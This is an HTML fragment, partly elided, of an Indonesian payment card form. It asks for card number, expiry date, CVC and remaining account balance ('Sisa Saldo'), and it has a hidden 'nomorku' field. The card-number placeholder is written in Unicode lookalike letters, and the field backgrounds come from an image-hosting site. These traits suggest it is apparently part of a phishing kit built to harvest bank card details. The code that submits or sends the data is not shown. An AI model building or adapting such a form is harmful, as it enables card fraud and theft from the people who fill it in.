...
<input type="hidden" id="nomorku" value="">
        ...
        <input type="tel" id="debit" name="debit" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="N𝗈𝗆𝗈𝗋 K𝖺𝗋𝗍𝗎" minlength="19" maxlength="19"
      required>
     <center>
      <div class="card-form__row"> 
       <div class="card-form__col"> 
        <div class="card-form__group"> 
         ...
         <input type="tel" placeholder="MM/YY" id="valid" name="valid" class="card-input__input -select" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required style="background-image: url(https://i.ibb.co/BTTS0by/Picsart-24-02-08-13-45-43-312.jpg);
 ...
 <input type="tel" class="card-input__input  -select" v-mask="'###'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" id="cvv" name="cvv"  placeholder="CVC" required maxlength="3" style="background-image: url(https://i.ibb.co/PcHW5S0/Picsart-24-02-08-13-47-00-656.jpg); background-attachment: scroll;
     background-color: none;
    background-repeat: no-repeat;
    background-size: 100% 100%;
    background-position: 100% 100%;"> 
        ...
        <input class="uang card-input__input" id="saldo" name="saldo" type="tel"  placeholder="Sisa Saldo"  minlength="1" required>
     <br><br></div>
   </div>
     </p>
